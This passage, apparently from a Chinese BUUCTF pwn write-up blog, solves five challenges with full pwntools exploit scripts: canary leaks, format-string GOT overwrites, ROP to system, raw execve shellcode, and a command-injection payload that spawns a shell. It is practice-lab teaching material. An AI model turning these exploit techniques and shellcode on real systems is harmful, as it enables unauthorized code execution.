<p>第四个功能也就是0911，我们可以借助这个函数进行栈溢出攻击。这个功能有个坑点，close(0)，笔者一开始构造了one_gadget，发现会失败，所以在构造rop的时候需要system(“cat flag”);直接读flag，另外想要使用这个函数还需要爆破一下urandom，选了0这个值</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/1.png"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)<span class="comment">#, log_level='debug')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27125</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Guess your option:'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'once..'</span>, content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">two</span>(<span class="params">content, n</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">       r.sendafter(<span class="string">'bored...'</span>, <span class="string">'a'</span>)</span><br><span class="line">       r.sendlineafter(<span class="string">'Satisfied?y/n'</span>, <span class="string">'n'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'bored...'</span>, content)</span><br><span class="line">    r.sendlineafter(<span class="string">'Satisfied?y/n'</span>, <span class="string">'y'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">three</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'think?)'</span>, content)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">four</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'9011'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'code:'</span>, content)</span><br><span class="line"></span><br><span class="line">two(<span class="string">'a'</span>, <span class="number">10</span>)</span><br><span class="line">one(<span class="string">'a'</span> * <span class="number">0xa9</span>)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0xa9</span>)</span><br><span class="line">canary = u64(r.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'[+] canary = '</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">three(<span class="string">'%a'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'0x0.0'</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">131</span></span><br><span class="line">li(<span class="string">'[+] addr = '</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('./2.23/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c53</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'cat flag'</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">0x602080</span>) + p64(system_addr)</span><br><span class="line">two(p1, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        four(<span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">        ll(<span class="string">'[-]'</span> + <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="greeting-mna-2016"><a href="#greeting-mna-2016" class="headerlink" title="greeting_mna_2016"></a>greeting_mna_2016</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/greeting_mna_2016/1.png"></p>
<p>简单题</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/greeting_mna_2016/2.png"></p>
<p>格式化字符串漏洞只有一次，所以我们可以改fini段为main，程序里面还有system，所以可以将printf或者strlen改为system，最后传入/bin/sh即可。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29425</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">fini = <span class="number">0x8049934</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">strlen_got = <span class="number">0x08049A54</span></span><br><span class="line">main_addr = <span class="number">0x080485ED</span></span><br><span class="line">addr = [<span class="number">0x804</span>, <span class="number">0x8490</span>, <span class="number">0x85ED</span>]</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'aa'</span></span><br><span class="line">p1 += p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">p1 += p32(strlen_got)</span><br><span class="line">p1 += p32(fini)</span><br><span class="line"></span><br><span class="line">one1 = addr[<span class="number">0</span>] - <span class="number">0x20</span></span><br><span class="line">p1 += <span class="string">b'%'</span> + <span class="built_in">bytes</span>(<span class="built_in">str</span>(one1), encoding=<span class="string">'utf-8'</span>) + <span class="string">b'c%12$hn'</span></span><br><span class="line"></span><br><span class="line">one2 = addr[<span class="number">1</span>] - addr[<span class="number">0</span>]</span><br><span class="line">p1 += <span class="string">b'%'</span> + <span class="built_in">bytes</span>(<span class="built_in">str</span>(one2), encoding=<span class="string">'utf-8'</span>) + <span class="string">b'c%13$hn'</span></span><br><span class="line"></span><br><span class="line">one3 = addr[<span class="number">2</span>] - addr[<span class="number">1</span>]</span><br><span class="line">p1 += <span class="string">b'%'</span> + <span class="built_in">bytes</span>(<span class="built_in">str</span>(one3), encoding=<span class="string">'utf-8'</span>) + <span class="string">b'c%14$hn'</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Please tell me your name... '</span>, p1)</span><br><span class="line">r.sendlineafter(<span class="string">'Please tell me your name... '</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="web-of-sci-volga-2016"><a href="#web-of-sci-volga-2016" class="headerlink" title="web_of_sci_volga_2016"></a>web_of_sci_volga_2016</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/1.png"></p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/2.png"></p>
<p>第一个红色框和printf格式化漏洞可以达成canary和stack_addr泄露。然后第二个gets可以达成ret2shellcode。</p>
<p><code>0xa0 - 0x18</code> = 0x88。shellcode的地址为46这里的偏移-192</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/3.png"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26205</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'%43$p.%46$p'</span></span><br><span class="line">r.sendlineafter(<span class="string">'Tell me your name first'</span>, p1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'[+] canary = '</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'[+] stack_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">p1 = shellcode + (<span class="number">0x88</span> - <span class="built_in">len</span>(shellcode)) * <span class="string">b'A'</span> + p64(canary) + <span class="number">3</span> * p64(<span class="number">0x0</span>) + p64(stack_addr - <span class="number">192</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-free-spirit"><a href="#pwnable-free-spirit" class="headerlink" title="pwnable_free_spirit"></a>pwnable_free_spirit</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="comment">// Not relevant.</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	system(<span class="string">"cat /flag"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="comment">// Variables follow Ghidra's default naming convention (Ghidra version 9.1).</span></span><br><span class="line">	<span class="type">char</span> local_50[<span class="number">0x30</span>]; <span class="comment">// $rsp + 0x18</span></span><br><span class="line">	<span class="type">void</span> *local_58;      <span class="comment">// $rsp + 0x10</span></span><br><span class="line">	<span class="type">void</span> *local_60;      <span class="comment">// $rsp + 0x8</span></span><br><span class="line"></span><br><span class="line">	setup();</span><br><span class="line"></span><br><span class="line">	local_58 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		read(<span class="built_in">stdin</span>, local_50, <span class="number">0x30</span>);</span><br><span class="line">		<span class="type">int</span> option = atoi(local_50);</span><br><span class="line">		<span class="keyword">switch</span> (option) {</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">goto</span> cleanup;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="comment">// Write to wherever local_58 is currently pointing to.</span></span><br><span class="line">			read(<span class="built_in">stdin</span>, local_58, <span class="number">0x20</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="comment">// Stack address leak.</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;local_58);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="comment">// Pointer overwrites.</span></span><br><span class="line">			local_60 = *(<span class="type">unsigned</span> <span class="type">long</span> *)(local_58 + <span class="number">0</span>);</span><br><span class="line">			local_58 = *(<span class="type">unsigned</span> <span class="type">long</span> *)(local_58 + <span class="number">8</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	cleanup:</span><br><span class="line">	<span class="built_in">free</span>(local_58); <span class="comment">// must pass the free checks to reach the return</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个程序的代码是笔者在pwnable.xyz那里看到的，还有一个后门，漏洞点在case3这里，可以看到60 = 58，58= 58 + 8其实就是fd和bk。58=bk。</p>
<p>我们有了后门是不是可以将ret地址给覆盖成后门，然后程序程序退出是不是就可以getshell了？</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_free_spirit/1.png"></p>
<p>程序一开始给了stack_addr，ret的地址与stack_addr偏移为0x58。利用case 1，将ret_addr布置到bk上，触发case 3:这个时候stack_addr这里的地址就变成了ret_addr。再次利用这种手法将ret_addr变成后门地址，将stack_addr这里的值变成stack_addr + 0x10。为什么要变成+ 0x10？因为最后程序会free(58)，所以我们在+0x10这里布置一个正常的堆块使得最后程序可以正确释放</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28174</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_in</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppp</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x400A3E</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'[+] stck_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">ret_addr = stack_addr + <span class="number">0x58</span></span><br><span class="line">li(<span class="string">'[+] ret_addr = '</span> + <span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">read_in(p64(ret_addr) * <span class="number">2</span>)</span><br><span class="line">ppp()</span><br><span class="line">read_in(p64(shell) + p64(stack_addr + <span class="number">0x10</span>))</span><br><span class="line">ppp()</span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0x21</span>)</span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p1 += p64(<span class="number">0x21</span>)</span><br><span class="line">r.sendlineafter(menu, p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-loveletter"><a href="#pwnable-loveletter" class="headerlink" title="pwnable_loveletter"></a>pwnable_loveletter</h2><p>这个题目令人意想不到的是连上去就可以执行命令。。</p>
<p>用预期做一下</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_loveletter/1.png"></p>
<p> <img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_loveletter/2.png"></p>
<p>protect里面将#&amp;这些东西给换成了心而心这个图案有是3字节，所以这里有一个溢出。但是有canary所以rop很困难，再回到主函数看到可以溢出到prolog_len，最后还有一个system而system里面的是三段拼起来的，所以我们可以利用溢出控制prolog_len，将prolog_len改成1,这样的话第一个就是e，有一个命令，<code>env sh -C sh</code>可以拿到shell</p>
<p>最后的payload为<code>p1 = 'nv sh -c bash ' + 'A' * (0x114 - 0x14 - 14 - 2 - 1) + '#\x01'</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">'nv sh -c bash '</span> + <span class="string">'A'</span> * (<span class="number">0x114</span> - <span class="number">0x14</span> - <span class="number">14</span> - <span class="number">2</span> - <span class="number">1</span>) + <span class="string">'#\x01'</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

